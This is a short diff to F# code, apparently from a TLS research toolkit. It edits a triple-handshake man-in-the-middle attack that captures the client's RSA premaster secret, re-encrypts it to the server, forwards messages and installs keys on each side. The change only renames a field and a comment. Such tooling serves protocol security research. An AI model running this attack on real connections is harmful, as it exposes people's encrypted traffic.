@@ -84,14 +84,14 @@ type Attack_TripleHandshake =
         // Get the PMS from the client ...
         let sst,snsc,scke  = FlexClientKeyExchange.receiveRSA(sst,snsc,sch) in
         // ... flow it into the other connection ...
-        let ckeys = {cnsc.keys with kex = snsc.keys.kex} in let cnsc = {cnsc with keys = ckeys} in
+        let ckeys = {cnsc.secrets with kex = snsc.secrets.kex} in let cnsc = {cnsc with secrets = ckeys} in
         // ... and re-encrypt it to the server
         let cst,cnsc,ccke  = FlexClientKeyExchange.sendRSA(cst,cnsc,cch) in
 
         // Forward the client CCS
         let sst,cst,_ = FlexCCS.forward(sst,cst) in
 
-        // Install keys in one direction for each side of the MITM
+        // Install secrets in one direction for each side of the MITM
         let sst = FlexState.installReadKeys  sst snsc in
         let cst = FlexState.installWriteKeys cst cnsc in
 
